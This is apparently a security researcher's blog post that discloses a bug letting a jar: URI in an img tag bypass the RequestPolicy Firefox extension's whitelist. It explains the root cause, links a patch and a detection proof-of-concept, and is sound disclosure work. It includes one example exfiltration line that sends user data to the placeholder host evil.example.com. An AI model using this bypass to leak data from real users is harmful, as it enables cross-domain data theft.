---
layout: post
title: "Bypassing RequestPolicy's whitelist using the jar: URI scheme"
date: 2013-11-29 04:11:39 -0400
comments: true
categories: 
---

Here's an interesting bug I found while looking at some cross-domain data-stealing issues. 
It's possible to bypass [RequestPolicy](https://www.requestpolicy.com/about.html)'s whitelist entirely by referencing a resource nested in a [jar URI](http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/):
```html Exfiltration example
<img src="jar:http://evil.example.com/logger?userdata=whatever!/foobar" />
```

Firefox will block the resource from being displayed even if it is 
valid (due to prior security issues with the jar URI scheme,) but a 
cross-domain request is made and it doesn't require JS to execute. This 
can be verified through the network pane in Firefox's dev tools. A limited amount of information *may* be sent back from the server by using timing information.

Requests to jar URIs don't get processed by RequestPolicy because [aContentLocation's asciiHost is undefined](https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1953) when the jar URI scheme is used, and [it gets treated as an internal request](https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L1962). 
Since all [internal requests are implicitly allowed](https://github.com/RequestPolicy/requestpolicy/blob/20815944fada20a34e75c54221e33259f11aa6c6/src/components/requestpolicyService.js#L2035), the request goes through.

I emailed Justin the patch a few months ago, but he hasn't responded.
 Hopefully this gets fixed on the addons.mozilla.org version soon, since
 it limits RequestPolicy's effectiveness at preventing data exfiltration. 

For now, you can use [my fork of RequestPolicy](https://github.com/JordanMilne/requestpolicy). 
I'm not sure if the patch has any interactions with extensions, but it should also fix issues with 
nested use of the view-source scheme (which for some reason doesn't implement [nsINestedURI](http://dxr.mozilla.org/mozilla-central/source/netwerk/base/public/nsINestedURI.idl))

<h3>Proof-of-Concept</h3>

If you'd like to see whether or not you're vulnerable, <a href="http://saynotolinux.com/tests/requestpolicy_jar.html">I've made a Proof-of-Concept</a> that detects whether or not RequestPolicy blocked an image from a jar URI.

Without the patch:

[{% img /images/posts/jar-broken.png %}](/images/posts/jar-broken.png)

With the patch:

[{% img /images/posts/jar-fixed.png %}](/images/posts/jar-fixed.png)

